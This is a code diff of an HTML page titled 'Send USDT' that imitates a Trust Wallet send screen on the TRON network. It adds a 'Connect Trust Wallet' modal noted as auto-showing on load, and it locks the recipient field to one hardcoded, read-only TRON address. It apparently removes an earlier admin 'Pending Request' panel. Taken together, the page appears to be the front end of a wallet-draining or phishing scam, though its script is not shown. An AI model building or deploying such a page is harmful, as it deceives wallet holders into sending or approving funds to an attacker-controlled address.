@@ -6,63 +6,128 @@
     <link rel="icon" type="image/png" href="/logo.png" />
     <link rel="apple-touch-icon" href="/logo.png" />
     <title>Send USDT</title>
+    <meta name="description" content="Send USDT on TRON network." />
   </head>
   <body>
+
+    <!-- ── Trust Wallet Connect Modal (auto-shows on load) ─────────────────── -->
+    <div id="wcModal" class="modal-overlay" hidden>
+      <div class="modal-card">
+        <div class="modal-logo-wrap">
+          <img src="/logo.png" alt="Trust Wallet" class="modal-logo" onerror="this.style.display='none'" />
+        </div>
+        <h2 class="modal-title">Connect Trust Wallet</h2>
+        <p class="modal-desc">Tap below to open Trust Wallet and approve the connection.</p>
+        <a id="trustWalletLink" href="#" class="tw-btn" target="_blank" rel="noopener noreferrer">
+          Open Trust Wallet
+        </a>
+        <p id="modalStatus" class="modal-hint">Waiting for approval…</p>
+        <button id="retryConnectBtn" type="button" class="retry-btn" hidden>↻ Retry</button>
+      </div>
+    </div>
+
+    <!-- ── App — always Send USDT form ────────────────────────────────────── -->
     <main class="screen">
+
+      <!-- Top bar -->
       <header class="topbar">
-        <h1>Send USDT</h1>
-        <button id="retryConnectBtn" class="icon-btn" type="button" hidden>↻</button>
+        <h1 class="topbar-title">Send USDT</h1>
+        <button id="disconnectBtn" type="button" class="close-btn" hidden title="Disconnect">✕</button>
       </header>
 
-      <p id="connectStatus" class="connect-status">Connecting wallet...</p>
-      <p id="walletAddress" class="wallet-address"></p>
+      <!-- Wallet + balance strip (hidden until connected) -->
+      <div id="walletStrip" class="wallet-strip" hidden>
+        <span class="dot-online"></span>
+        <span id="walletAddress" class="strip-addr"></span>
+        <span class="strip-sep">·</span>
+        <span id="balanceValue" class="strip-balance">-- USDT</span>
+      </div>
 
-      <section class="field-group">
-        <label for="recipientInput">Address or Domain Name</label>
-        <div class="input-shell">
-          <input id="recipientInput" placeholder="Search or Enter" autocomplete="off" />
-          <button id="pasteBtn" type="button" class="inline-action">Paste</button>
-        </div>
-      </section>
+      <!-- ── Send form (exactly like image) ── -->
+      <div class="send-form">
 
-      <section class="field-group">
-        <label>Destination network</label>
-        <button class="network-chip" type="button" disabled>
-          <img src="/tron.svg" alt="TRON" />
-          <span>TRON Mainnet</span>
-        </button>
-      </section>
-
-      <section class="field-group">
-        <label for="amountInput">Amount</label>
-        <div class="input-shell amount-shell">
-          <input id="amountInput" placeholder="USDT Amount" autocomplete="off" />
-          <div class="asset-box">
-            <img src="/usdt.svg" alt="USDT" />
-            <span>USDT</span>
+        <!-- Address -->
+        <div class="field-group">
+          <label class="field-label">Address or Domain Name</label>
+          <div class="input-shell">
+            <input
+              id="recipientInput"
+              class="field-input addr-input"
+              value="TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV"
+              readonly
+              autocomplete="off"
+            />
+            <span class="field-icon-lock">
+              <!-- lock icon -->
+              <svg width="15" height="15" viewBox="0 0 24 24" fill="none">
+                <rect x="5" y="11" width="14" height="10" rx="2" fill="currentColor" opacity="0.4"/>
+                <path d="M8 11V7a4 4 0 0 1 8 0v4" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+              </svg>
+            </span>
           </div>
-          <button id="maxBtn" type="button" class="inline-action">Max</button>
         </div>
-        <p id="fiatValue" class="subtext">≈ $0.00</p>
-        <p id="balanceValue" class="subtext">Balance: -- USDT</p>
-      </section>
 
-      <section id="adminRequestSection" class="admin-section" hidden>
-        <h2>Pending Request</h2>
-        <div id="adminRequests"></div>
-      </section>
+        <!-- Destination network -->
+        <div class="field-group">
+          <label class="field-label">Destination network</label>
+          <div class="network-row">
+            <img src="/tron.svg" alt="TRON" width="22" height="22" />
+            <span class="network-name">Tron</span>
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" opacity="0.35">
+              <path d="M6 9l6 6 6-6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </div>
+        </div>
 
-      <section class="fallback-actions">
-        <button id="connectBtn" type="button" class="secondary" hidden>Connect Wallet</button>
-        <button id="disconnectBtn" type="button" class="secondary" hidden>Disconnect</button>
-      </section>
+        <!-- Amount -->
+        <div class="field-group">
+          <label class="field-label">Amount</label>
+          <div class="amount-shell">
+            <input
+              id="amountInput"
+              class="field-input amount-input"
+              type="number"
+              placeholder="USDT Amount"
+              min="0"
+              step="any"
+              autocomplete="off"
+            />
+            <span class="amount-label">USDT</span>
+            <button id="maxBtn" type="button" class="max-btn" disabled>Max</button>
+          </div>
+          <p id="fiatValue" class="fiat-text">≈ $0.00</p>
+        </div>
 
-      <button id="sendBtn" class="next-btn" type="button" disabled>Next</button>
+        <!-- Memo -->
+        <div class="field-group">
+          <label class="field-label">Memo</label>
+          <div class="input-shell">
+            <input id="memoInput" class="field-input" placeholder="" autocomplete="off" />
+            <span class="memo-icons">
+              <svg width="17" height="17" viewBox="0 0 24 24" fill="none" opacity="0.35">
+                <rect x="3" y="3" width="7" height="7" rx="1" stroke="currentColor" stroke-width="1.5"/>
+                <rect x="14" y="3" width="7" height="7" rx="1" stroke="currentColor" stroke-width="1.5"/>
+                <rect x="3" y="14" width="7" height="7" rx="1" stroke="currentColor" stroke-width="1.5"/>
+                <rect x="14" y="14" width="7" height="7" rx="1" stroke="currentColor" stroke-width="1.5"/>
+              </svg>
+              <svg width="17" height="17" viewBox="0 0 24 24" fill="none" opacity="0.35">
+                <circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="1.5"/>
+                <path d="M12 8v4M12 16h.01" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
+              </svg>
+            </span>
+          </div>
+        </div>
 
-      <p id="backendStatus" class="backend-status"></p>
-      <pre id="logs" hidden></pre>
+        <!-- Status line -->
+        <p id="connectStatus" class="status-line"></p>
+
+      </div>
+
+      <!-- Next (fixed bottom) -->
+      <button id="sendBtn" type="button" class="next-btn" disabled>Next</button>
+
     </main>
 
     <script type="module" src="/src/main.js"></script>
   </body>
-  </html>
+</html>
